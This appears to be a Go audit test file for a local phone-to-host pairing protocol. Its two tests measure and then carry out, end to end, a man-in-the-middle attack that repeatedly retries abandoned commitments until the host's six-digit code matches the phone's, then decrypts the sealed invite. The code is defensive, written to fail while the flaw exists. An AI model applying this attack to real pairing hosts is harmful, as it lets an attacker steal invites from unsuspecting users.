package connectlocal

// Audit H1b (v0.3.0-pre.4, 61a5244): the v2 commitment stops the attacker from changing its key after
// it has seen the host's, but not from throwing the whole attempt away. The host answers every
// commitment with a fresh key before the phone side has to reveal anything, so once the attacker
// holds hostPub it already knows the code the host would show. If that is not the phone's code it
// closes the connection: the host shows no prompt, records nothing and takes the next commitment.
//
// The attacker therefore plays host to the phone first (fixing the phone's code), then repeats
// commit → hostPub → compute → drop against the real host until the code is the phone's, and only
// then reveals, honestly. The commitment check passes, the host's user sees the same six digits on
// both screens and approves, and the host seals the invite to the attacker. Nothing in v2 makes
// "each attempt cost the user a tap": the cost is one TCP connection.

import (
	"bufio"
	"context"
	"encoding/base64"
	"math"
	"net"
	"os"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// maxSilentAttempts is the most abandoned commitments a window may answer before a correct host
// ends it or starts to slow down. Any small number passes; the host at 61a5244 has no bound.
const maxSilentAttempts = 32

// tryCommit makes one attempt against the host: it sends the commitment, reads the host's key and
// returns the code the host would show for an honest reveal, without revealing.
func tryCommit(addr string, own KeyPair, nonce []byte, commitLine []byte) (hostPub []byte, code string, conn net.Conn, err error) {
	c, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, "", nil, err
	}
	if _, err := c.Write(commitLine); err != nil {
		c.Close()
		return nil, "", nil, err
	}
	m, err := readMessage(bufio.NewReader(c))
	if err != nil {
		c.Close()
		return nil, "", nil, err
	}
	hostPub, ok := decode32(m.PublicKey)
	if !ok {
		c.Close()
		return nil, "", nil, ErrFailed
	}
	s, err := NewSession(DefaultLabel, own, hostPub, true, nonce)
	if err != nil {
		c.Close()
		return nil, "", nil, err
	}
	return hostPub, s.Code, c, nil
}

func commitLineFor(own KeyPair, nonce []byte) []byte {
	commit := Commit(DefaultLabel, own.Public[:], nonce)
	return []byte(`{"commit":"` + enc(commit[:]) + `","device":"Pixel 9","v":2}` + "\n")
}

// TestAuditLocalPairingSilentRetries measures what the host lets a peer do before any reveal: it
// must not hand out an unbounded number of fresh keys (each one a free guess at the code) while its
// user sees nothing.
func TestAuditLocalPairingSilentRetries(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	var prompts atomic.Int32
	s := serve(t, ctx, HostOptions{Plaintext: auditInvite, Expires: time.Now().Add(20 * time.Second),
		Confirm: func(ctx context.Context, _, _ string) bool { prompts.Add(1); <-ctx.Done(); return false }})
	addr := s.addr(t)

	own, _ := NewKeyPair()
	nonce, _ := NewNonce()
	line := commitLineFor(own, nonce) // the same commitment every time: the host does not notice
	const measure = 3 * time.Second
	codes := map[string]struct{}{}
	answered := 0 // commitments the host answered with a fresh key (a free guess at the code)
	busy := 0     // the single-slot denial while the previous attempt's handler drains
	start := time.Now()
	for time.Since(start) < measure {
		_, code, c, err := tryCommit(addr, own, nonce, line)
		if err != nil {
			// A denial means the slot is busy (serialization), not that the host stopped: wait and
			// retry, as a real attacker would. The window never ends and nothing is ever revealed.
			busy++
			continue
		}
		c.Close() // no reveal
		answered++
		codes[code] = struct{}{}
	}
	elapsed := time.Since(start)
	t.Logf("%d busy denials during the %v measurement (single-slot serialization)", busy, measure)
	rate := float64(answered) / elapsed.Seconds()
	chance := func(window time.Duration) float64 { return 1 - math.Exp(-rate*window.Seconds()/1e6) }
	t.Logf("host answered %d abandoned commitments in %v (%.0f/s), %d different codes known to the peer, %d prompts shown",
		answered, elapsed.Round(time.Millisecond), rate, len(codes), prompts.Load())
	t.Logf("at this rate a machine in the middle makes the host's code equal the phone's with probability %.0f%% in the default 2 min window, %.0f%% in a 15 min one",
		100*chance(2*time.Minute), 100*chance(15*time.Minute))
	if answered > maxSilentAttempts {
		t.Fatalf("the host gave %d fresh keys to commitments that were never revealed, without a prompt and without ending the window (want at most %d)",
			answered, maxSilentAttempts)
	}
}

// TestAuditLocalPairingMITMRetriesUntilCodesMatch is the whole attack, end to end, against a real
// host and a real phone. The number of attempts is random (10^6 on average), so it only runs with
// TAILPOCKET_AUDIT_GRIND=1; it uses the longest window an app can open (15 minutes).
func TestAuditLocalPairingMITMRetriesUntilCodesMatch(t *testing.T) {
	if os.Getenv("TAILPOCKET_AUDIT_GRIND") == "" {
		t.Skip("set TAILPOCKET_AUDIT_GRIND=1: runs until the codes match, minutes on average")
	}
	const window = 15 * time.Minute
	ctx, cancel := context.WithTimeout(context.Background(), window+time.Minute)
	defer cancel()
	h := &auditHost{phoneCode: make(chan string, 1), prompts: make(chan string, 8), compared: make(chan [2]string, 8)}
	// The host as shipped: default HelloTimeout, the user approves only equal codes.
	h.s = serve(t, ctx, HostOptions{Plaintext: auditInvite, Expires: time.Now().Add(window),
		Confirm: func(ctx context.Context, code, _ string) bool {
			h.prompts <- code
			select {
			case pc := <-h.phoneCode:
				h.compared <- [2]string{code, pc}
				return pc == code
			case <-ctx.Done():
				return false
			}
		}})
	hostAddr := h.s.addr(t)
	mitm := mitmListen(t)
	outcome := make(chan string, 1)
	go func() {
		pc, err := mitm.Accept()
		if err != nil {
			return
		}
		defer pc.Close()
		phone := wire{pc, bufio.NewReader(pc)}
		var hello v2hello
		if err := phone.recv(&hello); err != nil {
			outcome <- "phone hello: " + err.Error()
			return
		}
		// Play host to the phone: its reveal fixes the code it shows.
		fake, _ := NewKeyPair()
		phone.send(t, map[string]any{"publicKey": enc(fake.Public[:]), "v": wireVersion})
		var rv v2reveal
		if err := phone.recv(&rv); err != nil {
			outcome <- "phone reveal: " + err.Error()
			return
		}
		phonePub, _ := base64.StdEncoding.DecodeString(rv.PublicKey)
		phoneNonce, _ := base64.StdEncoding.DecodeString(rv.Nonce)
		toPhone, err := NewSession(DefaultLabel, fake, phonePub, false, phoneNonce)
		if err != nil {
			outcome <- "phone session: " + err.Error()
			return
		}
		want := toPhone.Code

		// Retry against the host. Every attempt is an honest commitment; only matching ones are revealed.
		own, _ := NewKeyPair()
		nonce, _ := NewNonce()
		line := commitLineFor(own, nonce)
		start := time.Now()
		for n := 1; ; n++ {
			if ctx.Err() != nil {
				outcome <- "window closed before a match"
				return
			}
			hostPub, code, hc, err := tryCommit(hostAddr, own, nonce, line)
			if err != nil {
				outcome <- "host stopped answering after " + itoa(n) + " attempts: " + err.Error()
				return
			}
			if code != want {
				hc.Close()
				continue
			}
			t.Logf("attempt %d after %v: the host will show %s, the phone's code", n, time.Since(start).Round(time.Second), code)
			defer hc.Close()
			if err := writeLine(hc, map[string]any{"nonce": enc(nonce), "publicKey": enc(own.Public[:]), "v": wireVersion}); err != nil {
				outcome <- "reveal: " + err.Error()
				return
			}
			toHost, _ := NewSession(DefaultLabel, own, hostPub, true, nonce)
			approval, err := readMessage(bufio.NewReader(hc))
			if err != nil {
				outcome <- "host after the reveal: " + err.Error()
				return
			}
			box, _ := base64.StdEncoding.DecodeString(approval.Sealed)
			if plain, err := toHost.Open(box); err == nil {
				outcome <- "STOLEN " + string(plain)
				return
			}
			outcome <- "host replied " + approval.Status
			return
		}
	}()
	go func() {
		// The phone as shipped: it shows its code and waits for the host's user.
		_, _ = Pair(ctx, mitm.Addr().String(), PhoneOptions{Label: DefaultLabel, Device: "Pixel 9",
			OnCode: func(code string) { h.phoneCode <- code }})
	}()
	var got string
	select {
	case got = <-outcome:
	case <-ctx.Done():
		t.Fatal("attack did not finish")
	}
	if plain, ok := strings.CutPrefix(got, "STOLEN "); ok {
		t.Fatalf("the host showed exactly one prompt, the user compared two equal codes (%v) and approved; the attacker decrypted the invite: %s",
			<-h.compared, plain)
	}
	t.Log(got)
}
